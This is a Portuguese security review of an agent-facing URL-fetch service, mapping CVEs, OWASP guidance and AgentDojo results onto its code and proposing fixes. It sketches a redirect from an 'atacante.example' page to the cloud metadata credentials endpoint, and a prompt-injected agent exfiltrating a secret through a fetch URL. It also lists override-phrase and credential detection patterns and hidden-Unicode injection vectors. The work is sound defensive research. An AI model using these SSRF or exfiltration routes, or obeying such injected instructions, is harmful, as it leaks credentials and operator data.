# Frente E: segurança de um serviço que busca URLs arbitrárias e entrega o texto a agentes (2024–2026)

Data: 2026-10-28. Escopo: base de conhecimento externa para conferir o código do NINA. Não é auditoria linha a linha. Li `app/fetch/guard.py`, `client.py`, `render.py`, `app/retrieve/render.py`, `app/mcp_server/server.py` e `__main__.py`, e trechos de `app/api/auth.py`, `app/config.py`, `app/extract/*` e `.github/workflows/ci.yml`, só para adaptar as lições ao código.

Restrição de rede desta sessão: arxiv, nvd.nist.gov, osv.dev, playwright.dev, github.com (HTML), openai.com e microsoft.com estavam bloqueados. Funcionaram raw.githubusercontent.com, um clone git do repositório da spec do MCP, anthropic.com e platform.claude.com. Também li as docstrings do Playwright 1.63 instalado no `.venv`. As advisories do GitHub vieram do espelho `github/advisory-database` no raw.

Legenda de custo: **zero** (fora de `app/`: docs, CI, ops); **app/** (exige mexer em `app/`, que está congelado pela Emenda 15 do PREREG; precisa de aprovação e de passar pelo protocolo dev/confirmação quando afeta extração ou seleção); **pago** (exige rodada paga).

---

## 1. Lições acionáveis para o NINA (por impacto esperado)

### L1. [CRÍTICO] SSRF no navegador por redirect HTTP 3xx, service worker e popup: a mesma classe de falha das CVEs do Firecrawl e do Open WebUI

**O que as fontes mostram**
- A docstring de `Page.route` no Playwright 1.63 instalado (`.venv/.../playwright/sync_api/_generated.py`, linhas ~10598–10605) diz:
  - "The handler will only be called for the first url if the response is a redirect."
  - "`page.route()` will not intercept requests intercepted by Service Worker … We recommend disabling Service Workers when using request interception by setting `serviceWorkers` to `'block'`."
  - "`page.route()` will not intercept the first request of a popup page. Use `browser_context.route()` instead."
- **Firecrawl CVE-2026-32857** (GHSA-vjp8-2wgg-p734, versões ≤ 2.8.0, CVSS v4 7.8): "Network policy validation is applied only to the initial user-supplied URL and not to subsequent redirect destinations … the browser follows the redirect … without revalidating". Antes disso, a **CVE-2024-56800** (redirect-SSRF): os mantenedores corrigiram o engine HTTP, mas declararam o serviço Playwright "un-patchable"; o contorno foi um proxy (`PROXY_SERVER`) que bloqueia link-local. Fonte: resumos NVD/OpenCVE; não consegui abrir a advisory em si.
- **Open WebUI GHSA-w2rx-84hp-gg95 / CVE-2026-70479** (ago/2026, CVSS 7.7; li a advisory inteira e o código corrigido): o interceptador só validava `resource_type == 'document'`. A correção (0.11.0, commit `bef63a2ae`) é a receita de referência:
  1. Cada requisição interceptada é **buscada pelo próprio cliente Python seguro, com redirects desligados, revalidada a cada salto e depois entregue com `route.fulfill`**. Assim o Chromium nunca resolve DNS nem segue redirect sozinho.
  2. `new_page(service_workers='block')`.
  3. WebSocket com handler que nunca conecta ao servidor.
  O código corrigido está em `backend/open_webui/retrieval/web/utils.py`, `_intercept_navigation_sync`: `allow_redirects=False`, um laço de até 20 saltos com `validate_url` em cada um, e `route.fulfill(status, headers, body)`.

**Por que importa para o NINA**
- `app/fetch/render.py` valida cada requisição com `page.route("**/*")` e `route.continue_()`. Isso cobre sub-requisições (já está à frente do Open WebUI < 0.11) e WebSocket (corrigido no red-team do M4). **Não cobre redirects 3xx**: com `continue_()`, o Chromium segue o `Location` sozinho e o handler não é chamado de novo.
- Cenário concreto. `resolve_url("https://atacante.example/spa")` passa pelo httpx (shell SPA curta, então `should_render` dispara). No navegador, o atacante responde a navegação, ou um XHR, com `302 Location: http://169.254.169.254/latest/meta-data/iam/security-credentials/`. Como `page.content()` vira o documento do NINA, a resposta do metadata volta ao chamador: é uma primitiva de **leitura**, não cega.
- Mesmo efeito para requisições feitas de dentro de um service worker registrado pela página, e para a primeira requisição de um `window.open`, já que o handler é por página e não por contexto.
- A DECISIONS de 2026-10-11 registra só a janela de DNS rebinding como resíduo. Os testes centrais (`metadata_hits == 0`) cobrem sub-requisições e WS, mas não redirect, SW nem popup.
- **Não verifiquei empiricamente**: o Chromium não está instalado nesta sessão e o brief proíbe instalar. A evidência é a documentação oficial da versão instalada mais duas CVEs reais com o mesmo padrão.

**Mudança proposta**
1. Trocar `route.continue_()` por "buscar e entregar": o handler chama `app.fetch.client.fetch()`, que já conecta no IP validado, segue redirects manualmente com o guard a cada salto, aplica limite de corpo e `trust_env=False`, e responde com `route.fulfill(status=..., headers=..., body=...)`. Isso fecha redirect, SW e popup e também a janela de rebinding do navegador (a dívida da DECISIONS 2026-10-11), sem contrato novo. Cuidados:
   - repassar método e corpo de POST ou abortar não-GET;
   - repassar `Set-Cookie` de cada salto, como faz o Open WebUI;
   - manter o descarte de image/media/font.
2. `browser.new_context(accept_downloads=False, service_workers="block")` e `context.route(...)` / `context.route_web_socket(...)` no lugar de `page.route`.
3. Testes de regressão no mesmo estilo dos atuais (servidor contador em `--host-resolver-rules`):
   - navegação principal com 302 para metadata;
   - XHR com 302;
   - `window.open` para IP interno;
   - service worker que faz `fetch` interno;
   - iframe;
   - `<meta http-equiv=refresh>`;
   - fetch dentro de Web Worker dedicado.
   Os casos de redirect e SW devem falhar (count ≥ 1) sem a correção.
4. Até a correção: tratar render como opcional em produção (desligado ou só com `render=always` explícito), e o M11 deve pôr o processo do navegador numa rede sem rota para RFC1918/link-local, com IMDSv2 e hop-limit 1 na AWS.

**Custo:** app/ (é correção de segurança; vale pedir exceção à Emenda 15 só para `app/fetch/render.py`, porque não muda extração nem seleção quando o destino é legítimo). **Evidência:** primária (docstring Playwright 1.63 e advisory do Open WebUI lida na íntegra); Firecrawl só por resumos.

---

### L2. [ALTO] Defaults que falham abertos: autenticação desligada por padrão e servidor MCP HTTP sem autenticação usando a chave do operador

**O que as fontes mostram**
- **CVE-2025-66416 / GHSA-9h52-p55h-vw2f** (SDK Python do MCP, dez/2025, CWE-1188 "insecure default"): servidor HTTP em localhost, sem autenticação e sem `TransportSecuritySettings` era atacável por DNS rebinding a partir de qualquer site. A correção (≥ 1.23.0) liga a proteção por padrão só quando `host` é 127.0.0.1/localhost.
- A spec MCP 2026-07-28 (Streamable HTTP, "Security Warning"):
  - servidores **MUST** validar `Origin`;
  - **SHOULD** escutar só em localhost quando locais;
  - **SHOULD** autenticar todas as conexões.
- O guia de boas práticas proíbe token passthrough e descreve o confused deputy.
- O OWASP MCP Security Cheat Sheet repete os mesmos pontos.

**Por que importa para o NINA**
- `app/config.py:21`: `env: Literal["dev","production"] = "dev"`, e `app/api/auth.py` vira no-op quando `env == "dev"`. Um deploy que esqueça `ENV=production` expõe `/v1` sem chave, ou seja, um proxy de fetch aberto. É o mesmo CWE-1188 da CVE do SDK.
- `app/mcp_server/__main__.py` sobe Streamable HTTP "for remote use" com **uma** `API_KEY` de ambiente e sem autenticação do cliente MCP. Hoje o SDK 2.3.0 escuta em 127.0.0.1 e liga a proteção contra rebinding. Verifiquei em `mcp/server/mcpserver/server.py:1160–1166`. Mas qualquer `host=0.0.0.0` (Docker, "remote use") desliga a proteção e deixa qualquer um usar a chave e a cota do operador. Isso é um confused deputy.
- Contraexemplo de mercado a não copiar: MCP remoto com a chave no path da URL (padrão de alguns provedores). A chave acaba em logs de proxy.

**Mudança proposta**
1. Fail-closed: default `env="production"`, ou recusar escutar fora de loopback quando `env=="dev"`, com log de aviso na subida.
2. Modo remoto do MCP: montar o endpoint Streamable HTTP dentro do app FastAPI (`/mcp`) atrás de `require_api_key`, para que cada cliente use a própria chave `nina_...` emitida para o NINA (audiência correta, sem passthrough de token alheio). Ou recusar `host` não-loopback no `__main__` enquanto não houver autenticação. OAuth 2.1 completo da spec fica para depois do MVP.
3. Documentar no `.env.example` e no README que `ENV=dev` desliga a autenticação.

**Custo:** app/ (pequeno; `config.py` e `mcp_server/__main__.py` não tocam extração nem seleção). **Evidência:** primária (advisory, spec 2026-07-28 e código do SDK instalado).

---

### L3. [ALTO] O NINA como canal de exfiltração: espelhar a regra do web_fetch da Anthropic para URLs com credenciais

**O que as fontes mostram**
- A doc do web fetch tool (platform.claude.com, lida na íntegra) diz: "Claude can only fetch URLs that have previously appeared in the conversation", e "the tool also refuses a URL that appears to contain a credential, such as an API key or a password, unless that credential appears in the system prompt or in the text of a user message". Recomenda também `allowed_domains` e `max_uses`.

**Por que importa para o NINA**
- O NINA é uma ferramenta de fetch para agentes (MCP `assemble_context`/`resolve_url`). Uma página injetada pode instruir o agente a chamar `resolve_url("https://atacante.example/?k=<segredo do contexto>")`. O NINA faz o GET e o segredo chega ao servidor do atacante, mesmo que o conteúdo devolvido seja inútil.
- O NINA não vê a conversa, então não consegue aplicar a regra de "URL já apareceu". Mas a parte determinística ele consegue aplicar.

**Mudança proposta** (determinística, sem LLM)
1. Recusar com erro tipado (`url_not_allowed`), ou pelo menos marcar em `warnings`, URLs cujo userinfo, query ou path contenham padrões de credencial:
   - prefixos conhecidos (`sk-`, `sk-ant-`, `ghp_`/`github_pat_`, `AKIA`, `xox[bp]-`, `AIza`, `nina_`);
   - JWT (`eyJ…\.…\.…`);
   - parâmetros como `token=`, `api_key=`, `password=` com valor de alta entropia.
2. `allowed_domains` opcional por chave (JSONB `api_keys.limits`, que já existe) para quem quiser restringir aos domínios de docs.
3. Já existe e é bom: o netloc é reconstruído sem userinfo (`guard._rebuild_netloc`), então `user:pw@` nunca é enviado.

**Custo:** app/ (guard/API; não afeta o benchmark, cujas URLs não têm credenciais). **Evidência:** primária (doc oficial); a ameaça em si é padrão na literatura (Greshake et al. e OWASP LLM: "Data Exfiltration").

---

### L4. [ALTO] Texto oculto e Unicode invisível: o NINA não remove nem sinaliza nada

**O que as fontes mostram**
- **Guardian, 24/12/2024**: o ChatGPT Search foi manipulado por texto oculto numa página de produto. Uma avaliação equilibrada virou "quase só positiva" com as avaliações negativas ainda visíveis. Fonte: só resumos.
- **Verma & Yadav, arXiv 2509.05831** (set/2025): 280 páginas, metade com injeção em HTML não visível (meta, aria-label, alt etc.). Mais de 29% das amostras injetadas mudaram o resumo do Llama 4 Scout e cerca de 15% o do Gemma 9B. Fonte: só o abstract.
- **Anthropic, "Mitigating the risk of prompt injections in browser use"** (24/11/2025, lido na íntegra): os classificadores varrem "all untrusted content that enters the model's context window" e detectam "hidden text, manipulated images, deceptive UI elements". O Opus 4.5 chegou a ~1% de ASR contra um atacante adaptativo Best-of-N com 100 tentativas; "a 1% attack success rate … still represents meaningful risk".
- **OWASP LLM Prompt Injection Prevention Cheat Sheet** (lido na íntegra):
  - caracteres de tag Unicode (U+E0000–E007F) carregam instruções que os modelos leem;
  - "If you screen a cleaned copy but forward the original, the hidden text still reaches the model";
  - NFKC não remove zero-width;
  - não aplicar normalização de compatibilidade às cegas.
- Trojan Source (CVE-2021-42574): controles bidi (U+202A–202E, U+2066–2069) fazem o código exibido diferir do código executado. Isso é relevante porque o NINA entrega blocos `code` que agentes copiam.
- Contexto adicional: a SPLX (out/2025, via The Hacker News) descreveu "AI-targeted cloaking", em que o servidor serve conteúdo diferente conforme o user-agent de crawlers de IA. O NINA se identifica honestamente (regra do CLAUDE.md), então é alvo trivial desse cloaking.

**Por que importa para o NINA**
- `app/extract/html.py` remove `nav/footer/aside/script/style/noscript` e chrome, e o walker já ignora comentários (linha ~185). Mas não trata:
  - `display:none`/`visibility:hidden`/`font-size:0` inline, `aria-hidden="true"` ou o atributo `hidden`;
  - texto de cor igual ao fundo;
  - caracteres de tag Unicode, zero-width, bidi ou sequências ANSI/C0.
  Nenhum grep em `app/extract|index|retrieve` acha `unicodedata` ou esses intervalos.
- O formato concise neutraliza só os nomes das tags do NINA.
- **Cuidado específico de docs:** Docusaurus e vários temas renderizam as abas inativas (por exemplo os exemplos em outras linguagens) com o atributo `hidden` ou com CSS. Remover `hidden` às cegas apagaria código útil e pioraria o benchmark. Pelo mesmo motivo, o `<details>` fechado precisa ficar.

**Mudança proposta**
1. Nível de caractere (seguro e determinístico), em `to_markdown` ou no IR:
   - remover U+E0000–E007F;
   - remover controles C0 exceto `\t\n` e sequências ANSI `\x1b[…`;
   - remover bidi overrides dentro de `code`; fora de code, remover e registrar warning `invisible_chars_removed` com a contagem;
   - zero-width (U+200B/C/D, U+2060, U+FEFF): remover fora de code; em code, avisar.
2. Nível de elemento: **medir antes no corpus** quantos blocos sairiam com cada regra. Regra candidata de baixo risco:
   - remover `aria-hidden="true"` sem filhos de texto longo (ícones e "¶");
   - remover `style` inline com `display:none|visibility:hidden|font-size:0|opacity:0` **exceto** em painéis de aba (`role="tabpanel"` e classes de tabs) e `<details>`;
   - nunca remover pelo atributo `hidden` sozinho;
   - sempre emitir `hidden_text_removed` em `warnings` (regra "falha explícita").
3. Aceitar o limite: CSS externo (classes) e branco-no-branco exigiriam render com cálculo de estilo. No caminho browser dá para usar `element.checkVisibility()`, mas isso é fora do MVP.

**Custo:** app/ (afeta a extração, então passa pelo protocolo da metade B; espera-se custo de qualidade ≈ 0, a verificar). **Evidência:** OWASP e Anthropic primárias; Guardian e arXiv 2509.05831 só por resumos.

---

### L5. [MÉDIO] Sinalizar texto com cara de instrução em `<nina_notes>`, sem bloquear

**O que as fontes mostram**
- **AgentDojo** (tabela oficial `docs/results-table.html`, lida inteira; colunas: utilidade sem ataque, utilidade sob ataque, ASR), com GPT-4o-2024-05-13 e o ataque `important_instructions`:

  | Defesa | Utilidade | Sob ataque | ASR |
  |---|---|---|---|
  | sem defesa | 69,07% | 50,08% | **47,69%** |
  | `transformers_pi_detector` | **41,24%** | 21,14% | **7,95%** |
  | `tool_filter` | 72,16% | 56,28% | 6,84% |
  | `spotlighting_with_delimiting` | 72,16% | 55,64% | **41,65%** |

- Ou seja: um detector que **bloqueia** derruba o ASR, mas corta quase metade da utilidade por falsos positivos.
- O OWASP lista evasões de filtros por palavra-chave: typoglycemia, Best-of-N, codificações e homóglifos.

**Por que importa para o NINA**
- A regra "sem LLM na seleção" impede um classificador neural de verdade. Bloquear por regex derrubaria páginas legítimas: docs de engenharia de prompt contêm "ignore previous instructions".
- O NINA é provedor de conteúdo. O papel que lhe cabe é dar sinal com proveniência ao agente.

**Mudança proposta:** um detector determinístico, com padrões em inglês tipo "ignore (all )?(previous|prior) instructions", "you are now", "system prompt", "do not tell the user", "<\|im_start\|>", "\[INST\]", "</?(system|assistant)>" e imperativos dirigidos a "AI/assistant/LLM/agent". Ele emite a hint `possible_instructions_in_source` com os `chunk_id`s em `<nina_notes>` e `warnings`, sem remover nada. Documentar que é sinal fraco, não defesa.

**Custo:** app/ (`retrieve/hints.py`; não muda a seleção). **Evidência:** AgentDojo primária; a eficácia de regex é fraca por construção.

---

### L6. [MÉDIO, custo zero] Calibrar o que se promete sobre as tags `<fragment>`/`<nina_notes>`

**O que as fontes mostram**
- Na tabela do AgentDojo, delimitar ("spotlighting with delimiting") quase não reduz o ASR: 47,7% → 41,7%.
- **Spotlighting** (Hines et al. 2024; só resumos, arXiv bloqueado): **datamarking** (intercalar um marcador entre palavras) levou o GPT-3.5 de ~50% a < 3% de ASR, e **encoding** (base64) levou a ~0%, mas encoding derruba modelos fracos.
- O OWASP diz: "do not treat text labels or prompt wording as an enforcement boundary".
- O paper "Design Patterns for Securing LLM Agents against Prompt Injections" (Beurer-Kellner, Tramèr et al., 2025; só resumos) e o CaMeL (Debenedetti et al., Google/DeepMind/ETH, 2025; li só o README do repositório) sustentam que a defesa real está na arquitetura do agente: plan-then-execute, dual LLM e fluxo de dados com capacidades. Não está no rótulo do conteúdo.

**Por que importa para o NINA:** `app/retrieve/render.py` cita Spotlighting como fundamento. Datamarking e encoding são incompatíveis com a evidência verbatim e com código copiável, que são o núcleo do produto. O que o NINA implementa é delimitação mais **anti-forja**: a página não consegue fechar `<fragment>` nem abrir `<nina_notes>`. Isso tem valor real para a integridade das hints e da proveniência, mas não é defesa contra injeção.

**Mudança proposta:** ajustar o texto de SPEC/DECISIONS/skill e qualquer material de venda:
- "as tags garantem que o texto da página não forja notas nem proveniência do NINA; elas não impedem injeção — a defesa é do agente (privilégio mínimo, confirmação humana para ações)";
- citar o número do AgentDojo;
- não usar Spotlighting como justificativa de eficácia, só de formato.

**Custo:** zero. **Evidência:** AgentDojo primária; Spotlighting e Design Patterns por resumos.

---

### L7. [MÉDIO] Esgotamento de recursos: o caminho do navegador e o de PDF não têm teto, e há amplificação

**O que as fontes mostram e o estado do NINA**
- O caminho httpx está bem: corpo limitado em streaming (`_read_capped_body`, 15 MB contados *após* a descompressão, porque `iter_bytes` decodifica).
  - Resíduo: o `GZipDecoder` do httpx descomprime cada chunk de rede sem `max_length`. Um chunk de ~64 KB de gzip pode virar dezenas de MB antes da checagem, o que é limitado mas gera um pico.
  - Brotli e zstd não estão instalados no venv (verificado), então o httpx não os anuncia. Manter assim: bombas brotli têm razão muito maior.
- **O caminho do navegador ignora `max_body_bytes`**: `page.content()` não tem limite, e o JS da página pode gerar um DOM de centenas de MB.
- **PDF**: `app/extract/pdf.py` não limita páginas nem tempo de CPU. pdfminer tem histórico de DoS e acaba de ter duas CVEs de desserialização pickle no carregamento de CMap:
  - CVE-2025-64512, corrigida em 20251107: execução de código a partir de PDF malicioso;
  - CVE-2025-70559, correção incompleta, resolvida em 20251230.
  O venv tem `pdfminer-six 20260107`, já corrigido. Manter o piso no `pyproject`.
- **lxml**: `huge_tree` fica no default `False` (bom, limita nós gigantes). O parser HTML não resolve entidades externas (sem XXE). Risco residual: truncamento silencioso por profundidade em HTML patológico, que deveria virar warning.
- **Amplificação**: um `assemble` aceita 20 URLs, e cada uma pode disparar render. Uma chave pode usar o NINA para varrer ou martelar terceiros. O rate-limit é por processo (`config.py`) e se multiplica com vários workers.

**Mudança proposta**
1. Teto de tamanho do HTML renderizado (reaproveitar `max_body_bytes`), `--js-flags=--max-old-space-size=256` e timeout de `goto` explícito.
2. PDF: `max_pages` (por exemplo 500) com warning `pdf_truncated`, e extração num subprocesso com timeout e `RLIMIT_AS`.
3. Concorrência por host e orçamento diário de fetches por chave (o JSONB `limits` já existe).
4. Fixar o pdfminer.six em ≥ 20251230 no `pyproject`.

**Custo:** app/ (itens 1–3); item 4 é zero. **Evidência:** advisories pdfminer por resumos; o estado do código foi verificado.

---

### L8. [MÉDIO] Lacunas finas na política de IP do guard

Testei no Python do venv (3.12.3, build Ubuntu com backports).
- **`::127.0.0.1`** (IPv4-compatível, `::/96`, depreciado) dá `is_global == True`, e `_unwrap_embedded_ipv4` só desembrulha `::ffff:`, NAT64 e 6to4. Em Linux comum, conectar a `::7f00:1` não chega ao loopback v4 (sem sit0), mas a recomendação do MCP SBP é justamente "avoid implementing IP validation manually … IPv4-mapped" etc.
  Proposta: tratar `::/96` como embutido ou bloquear `::/8` inteiro.
- **`fec0::/10`** (site-local, depreciado) dá `is_global == True`, e o NINA não testa `is_site_local`. Proposta: bloquear.
- **Azure WireServer `168.63.129.16`** é IP público (`is_global True`), mas é endpoint de plataforma acessível de dentro das VMs Azure (configuração de extensões, saúde). Proposta: deny-list explícita por provedor, a exemplo da tabela do OWASP (que lista IMDS AWS, GCP e Azure, `fd00:ec2::254` etc.), configurável por ambiente no M11.
- Já cobertos por `is_global`/`is_private`: `64:ff9b:1::/48`, Teredo `2001::/32`, `192.0.0.0/24` (Oracle `192.0.0.192`), Alibaba `100.100.100.200` (CGNAT), AWS IPv6 IMDS `fd00:ec2::254` (ULA).
- **Hairpin para o próprio IP público do host**: o guard aceita IPs públicos, inclusive o do próprio servidor. A allow-list de portas 80/443 reduz muito o risco, mas um painel em :443 no mesmo host ficaria exposto. Proposta: no M11, proxy de egress (Smokescreen ou equivalente) e/ou regra de firewall que negue o próprio IP público.
- **Versão do Python**: a política depende de `ipaddress` corrigido (CVE-2024-4032, classificação errada de is_private/is_global, corrigida em 3.12.4) e de `urlsplit` rejeitando hosts entre colchetes inválidos (CVE-2025-0938). O 3.12.3 do venv se comporta como corrigido nos meus testes (`[evil.com]` gera ValueError; `64:ff9b:1::` é privado), mas isso é backport da distro. Proposta: imagem Docker com CPython ≥ 3.12.10 e um teste unitário que trave essas classificações.
- Detalhe para o auditor de código: `urlsplit` pode levantar `ValueError` (colchetes, porta dupla) antes de qualquer `try` em `validate_url`. Confirmar que isso vira `InvalidURL` e não 500.

**Custo:** app/ (guard; não afeta o benchmark). **Evidência:** testes locais (primária); OWASP e MCP SBP primárias; WireServer é conhecimento de plataforma, sem fonte lida aqui.

---

### L9. [MÉDIO, custo zero] Endurecer o CI e a cadeia de suprimentos

**O que as fontes mostram**
- **tj-actions/changed-files, CVE-2025-30066** (mar/2025; CISA): as tags v1–v45.0.7 foram reapontadas para um commit malicioso que despejou segredos da memória do runner nos logs. Mais de 23.000 repositórios afetados. A provável origem foi o comprometimento de `reviewdog/action-setup@v1` (CVE-2025-30154).
- A doc do GitHub "Secure use reference" (lida na íntegra) recomenda:
  - `GITHUB_TOKEN` só leitura por padrão;
  - fixar actions por **SHA completo**;
  - novidade: **lockfiles de dependências de workflow**, que "supersedes SHA pinning";
  - evitar `pull_request_target`/`workflow_run` com código não confiável;
  - Dependabot para actions, CodeQL/Scorecard para workflows.
- zizmor (README lido) é um linter estático de workflows (template injection, permissões, pinning).

**Estado do NINA** (`.github/workflows/ci.yml`): sem bloco `permissions:`; `actions/checkout@v4` e `astral-sh/setup-uv@v5` por tag; `uv sync` sem `--locked`; nenhum passo de auditoria de vulnerabilidades ou de segredos. É positivo que não use `pull_request_target`.

**Mudança proposta**
1. `permissions: contents: read` no topo do workflow.
2. Fixar as actions por SHA (com o comentário da tag) e ligar o Dependabot para `github-actions`.
3. `uv sync --locked`. O `uv.lock` já traz hashes.
4. Passo `uvx pip-audit` (ou `osv-scanner --lockfile uv.lock`).
5. `gitleaks` (o prefixo `nina_` facilita uma regra customizada).
6. `zizmor` no CI.
7. Trivy na imagem quando houver Dockerfile (M11).

**Custo:** zero (fora de `app/`). **Evidência:** primária (doc do GitHub e README do zizmor); o incidente por resumos da CISA e da Wiz.

---

### L10. [BAIXO-MÉDIO] Endurecer o Chromium além do `route`

Vetores que o Playwright não intercepta, e o que fazer com cada um:
- **WebRTC/STUN/TURN (UDP)**: ICE pode tocar IPs internos. Desligar com init script (`delete window.RTCPeerConnection`) e/ou `--force-webrtc-ip-handling-policy=disable_non_proxied_udp`.
- **DNS prefetch / preconnect**: só vazamento por DNS. Usar `--dns-prefetch-disable`.
- Usar também `--disable-background-networking`.
- Rodar o navegador num contêiner ou namespace de rede só com egress público, sem credenciais de nuvem no ambiente. O Open WebUI explicita isso: "A deployment whose browser container has no route to internal services loses nothing here".

**Custo:** app/ (flags) e M11 (rede). **Evidência:** advisory do Open WebUI (primária) e conhecimento geral do Chromium; os flags não foram verificados nesta sessão.

---

### L11. [BAIXO] Higiene específica de MCP

- O NINA já acerta:
  - descrições de ferramenta estáticas, sem conteúdo de página;
  - `INSTRUCTIONS` sem texto de terceiros;
  - erros sem texto de página;
  - `structured_output=False`, sem segunda cópia.
  Isso evita **tool poisoning** pelo próprio servidor.
- **Rug pull** (a descrição muda depois da aprovação): clientes como o mcp-scan comparam hashes das descrições. Proposta: versionar as descrições (changelog e teste de snapshot, que já é prática do repositório) para que uma mudança seja deliberada e visível.
- Se o NINA implementar OAuth remoto: tokens com audiência do NINA, sem repassar token de terceiros (MUST NOT da spec).

**Custo:** zero ou app/ mínimo. **Evidência:** spec MCP e OWASP MCP (primárias).

---

## 2. Onde o NINA já está igual ou melhor (com evidência)

1. **Conectar no IP validado preservando Host e SNI** (`client.py`, decisão D1). É exatamente o que o OWASP SSRF Cheat Sheet passou a exigir ("connect only to validated addresses … preserving the original hostname for the HTTP Host header, TLS SNI"). O fetch-mcp (CVE-2025-65513, sem patch), o LangChain WebResearchRetriever (CVE-2024-3095; a correção foi um flag opt-in) e o Open WebUI antes da 0.6.37 (CVE-2025-65958, sem validação nenhuma) ficaram aquém.
2. **Redirects manuais revalidados no caminho HTTP**, com o guard a cada salto. A CVE-2024-56800 do Firecrawl foi justamente isso no engine HTTP.
3. **Todos os registros A/AAAA validados (fail-closed)**, mais literais em notação alternativa (decimal, octal, hex, curta, ponto final) rejeitados antes do DNS, mais NAT64/6to4/mapeado desembrulhados. É mais completo que a recomendação do MCP SBP e que o CC-Tweaked citado pelo OWASP.
4. **Diferencial de parser neutralizado pela normalização**: o netloc é reconstruído a partir do hostname, então userinfo e `\@` somem. Testei: para `http://127.0.0.1\@example.com/`, `urlsplit` lê `example.com` e o WHATWG leria `127.0.0.1`, mas o NINA passa ao Chromium só `http://example.com/...` e reconecta por IP no httpx. O OWASP agora pede "treat parser disagreement as a rejection"; o NINA chega ao mesmo efeito por construção.
5. **Sub-requisições e WebSocket do navegador validados**, à frente do Open WebUI 0.9.6–0.10.x (GHSA-w2rx), que só validava o documento. O teste de WS prova a correção empiricamente (DECISIONS 2026-10-11).
6. `trust_env=False` (variáveis de proxy não sequestram o cliente), allow-list de portas 80/443, timeouts, limite de corpo em streaming e corpo pós-descompressão contado.
7. **MCP local**: o SDK 2.3.0 escuta em 127.0.0.1 com proteção contra DNS rebinding por padrão (pós CVE-2025-66416). O padrão stdio não é afetado.
8. **Conteúdo**: `trust: untrusted_source`, aviso nas descrições das ferramentas e em `INSTRUCTIONS`, e tags anti-forja. Mais um ponto que muitos leitores de URL não têm: **o Markdown do NINA não contém imagens nem links inline**. O IR guarda `links` à parte, e `to_markdown` não emite `![]()`. Com isso não existe o vetor clássico de exfiltração por imagem que se carrega sozinha no Markdown (OWASP: `<img src=evil?data=SECRET>`).
9. **Chaves**: `nina_` + 256 bits (`token_urlsafe(32)`), guardadas só como sha256 com lookup por hash. Para chave de alta entropia, sha256 basta (não precisa de bcrypt), e o prefixo permite varredura de segredos.

## 3. Onde o NINA está atrás de alguém (lacunas honestas)

- **Open WebUI ≥ 0.11**: navegador em modo buscar-e-entregar (redirect, SW e rebinding fechados) e `service_workers='block'`. O NINA ainda usa `continue_()` (ver L1).
- **web_fetch da Anthropic**: recusa URLs com credenciais e restringe a URLs que já apareceram na conversa, com `allowed_domains` e `max_uses`. O NINA não tem nenhum desses controles anti-exfiltração (L3).
- **Anthropic e OpenAI** varrem o conteúdo não confiável com classificadores (texto oculto incluso) e fazem red teaming adaptativo contínuo. O NINA não remove texto oculto nem caracteres invisíveis (L4) e não emite sinal de injeção (L5). Classificador neural é vedado pela regra sem LLM; o equivalente determinístico ainda não existe.
- **Stripe Smokescreen e egress dedicado**: o NINA depende só do guard em processo. O egress de rede está planejado para o M11, mas ainda não existe, e é o único controle que cobre o que o guard não vê (WebRTC, hairpin, bugs futuros).
- **CI**: atrás do baseline da própria documentação do GitHub (L9).
- **Defaults**: autenticação desligada por padrão e MCP HTTP sem autenticação (L2), atrás do que a spec MCP pede (SHOULD autenticar, MUST validar Origin).

## 4. Fontes lidas na íntegra

- OWASP, Server-Side Request Forgery Prevention Cheat Sheet: https://raw.githubusercontent.com/OWASP/CheatSheetSeries/master/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.md
- OWASP, LLM Prompt Injection Prevention Cheat Sheet: https://raw.githubusercontent.com/OWASP/CheatSheetSeries/master/cheatsheets/LLM_Prompt_Injection_Prevention_Cheat_Sheet.md
- OWASP, MCP Security Cheat Sheet: https://raw.githubusercontent.com/OWASP/CheatSheetSeries/master/cheatsheets/MCP_Security_Cheat_Sheet.md
- MCP, Security Best Practices (rev. 2026-07-28; também comparado com o draft): https://github.com/modelcontextprotocol/modelcontextprotocol/blob/main/docs/docs/2026-07-28/tutorials/security/security_best_practices.mdx
- MCP, Streamable HTTP transport (rev. 2026-07-28), seção Security Warning: https://github.com/modelcontextprotocol/modelcontextprotocol/blob/main/docs/specification/2026-07-28/basic/transports/streamable-http.mdx
- GHSA-9h52-p55h-vw2f / CVE-2025-66416 (SDK Python do MCP, DNS rebinding): https://github.com/advisories/GHSA-9h52-p55h-vw2f
- GHSA-w2rx-84hp-gg95 / CVE-2026-70479 (Open WebUI, SSRF no loader Playwright): https://github.com/advisories/GHSA-w2rx-84hp-gg95
- GHSA-c6xv-rcvw-v685 / CVE-2025-65958 (Open WebUI, `/process/web`): https://github.com/advisories/GHSA-c6xv-rcvw-v685
- GHSA-8fxj-2g9q-8fjw / CVE-2025-65513 (fetch-mcp): https://github.com/advisories/GHSA-8fxj-2g9q-8fjw
- Open WebUI, `retrieval/web/utils.py` corrigido (interceptador buscar-e-entregar): https://github.com/open-webui/open-webui/blob/main/backend/open_webui/retrieval/web/utils.py
- Playwright 1.63, docstrings de `Page.route` e `BrowserContext.route` (pacote instalado no `.venv`).
- Anthropic, "Mitigating the risk of prompt injections in browser use" (24/11/2025): https://www.anthropic.com/research/prompt-injection-defenses
- Anthropic, Web fetch tool (URL validation, exfiltração): https://platform.claude.com/docs/en/agents-and-tools/tool-use/web-fetch-tool
- AgentDojo, tabela de resultados: https://github.com/ethz-spylab/agentdojo/blob/main/docs/results-table.html (e o README)
- CaMeL, README do artefato: https://github.com/google-research/camel-prompt-injection
- Stripe Smokescreen, README: https://github.com/stripe/smokescreen
- Doyensec safeurl, README: https://github.com/doyensec/safeurl
- Advocate, README (marcado como não mantido): https://github.com/JordanMilne/Advocate
- GitHub Docs, "Secure use reference" (Actions): https://github.com/github/docs/blob/main/content/actions/reference/security/secure-use.md
- zizmor, README: https://github.com/zizmorcore/zizmor
- Código do SDK `mcp` 2.3.0 instalado (`mcp/server/mcpserver/server.py`, `transport_security.py`).

Só por resumos de busca (não li o original): Firecrawl CVE-2026-32857 e CVE-2024-56800; LangChain CVE-2024-3095 e CVE-2023-46229; Flowise CVE-2025-59527 e CVE-2026-31829; AnythingLLM CVE-2024-0759; Dify CVE-2025-0184; pdfminer CVE-2025-64512 e CVE-2025-70559; tj-actions CVE-2025-30066 (CISA, Wiz); Guardian sobre o ChatGPT Search; SPLX "AI-targeted cloaking"; Verma & Yadav arXiv 2509.05831; Spotlighting arXiv 2403.14720; Design Patterns arXiv 2506.08837; OpenAI "Hardening Atlas" (22/12/2025); AWS sobre Unicode smuggling.

